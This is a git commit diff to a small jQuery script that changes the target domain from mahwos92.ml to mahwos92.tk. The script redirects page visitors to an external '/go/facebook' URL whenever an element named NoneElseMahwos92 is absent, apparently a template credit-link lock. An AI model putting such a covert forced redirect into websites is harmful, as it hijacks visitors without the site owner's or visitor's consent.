d434fa0ac9d6a97abce137055976d9303f7a5c00
NFaurass <36932043+NFaurass@users.noreply.github.com>
2018-03-18 17:48:42 +0000

    Update NoneElseMahwos92.js

--- NoneElseMahwos92.js
+++ NoneElseMahwos92.js
@@ -3,8 +3,8 @@ $(document).ready(function()
 {
 var aa=$("#NoneElseMahwos92").val();
 if (aa == null) {
-window.location.href = "https://www.mahwos92.ml/go/facebook";
+window.location.href = "https://www.mahwos92.tk/go/facebook";
 };
-$("#NoneElseMahwos92").attr("href","https://www.mahwos92.ml/go/facebook");
+$("#NoneElseMahwos92").attr("href","https://www.mahwos92.tk/go/facebook");
 });
 //]]>
